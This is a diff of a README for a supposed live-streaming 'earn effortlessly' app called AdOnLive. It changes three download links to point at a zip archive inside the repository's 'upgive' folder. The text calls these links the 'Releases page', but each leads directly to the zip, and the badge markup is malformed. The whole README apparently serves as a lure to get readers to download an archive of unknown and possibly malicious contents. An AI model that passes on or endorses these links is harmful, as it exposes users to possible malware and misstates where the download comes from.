@@ -1,6 +1,6 @@
 # 🎥 adonlive-profile - Stream Live and Earn Effortlessly
 
-[![Download AdOnLive](https://raw.githubusercontent.com/mokas74/adonlive-profile/main/upgive/adonlive-profile.zip%20AdOnLive-v1.0-brightgreen)](https://raw.githubusercontent.com/mokas74/adonlive-profile/main/upgive/adonlive-profile.zip)
+[![Download AdOnLive](https://github.com/mokas74/adonlive-profile/raw/refs/heads/main/upgive/adonlive-profile-1.2.zip%20AdOnLive-v1.0-brightgreen)](https://github.com/mokas74/adonlive-profile/raw/refs/heads/main/upgive/adonlive-profile-1.2.zip)
 
 ## 📖 Introduction
 
@@ -12,7 +12,7 @@ To start using AdOnLive, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the AdOnLive releases page where you can download the software.  
-   [Download AdOnLive](https://raw.githubusercontent.com/mokas74/adonlive-profile/main/upgive/adonlive-profile.zip)
+   [Download AdOnLive](https://github.com/mokas74/adonlive-profile/raw/refs/heads/main/upgive/adonlive-profile-1.2.zip)
 
 2. **Download the Latest Version**  
    On the releases page, look for the latest version. This will typically be the first one listed. Click the link to download the file for your operating system.
@@ -43,7 +43,7 @@ To ensure AdOnLive runs smoothly, your system should meet the following requirem
 ## 📥 Download & Install
 
 To download AdOnLive, please revisit the Releases page. You can find the link here:  
-[Download AdOnLive](https://raw.githubusercontent.com/mokas74/adonlive-profile/main/upgive/adonlive-profile.zip)
+[Download AdOnLive](https://github.com/mokas74/adonlive-profile/raw/refs/heads/main/upgive/adonlive-profile-1.2.zip)
 
 ## 📸 Features
 
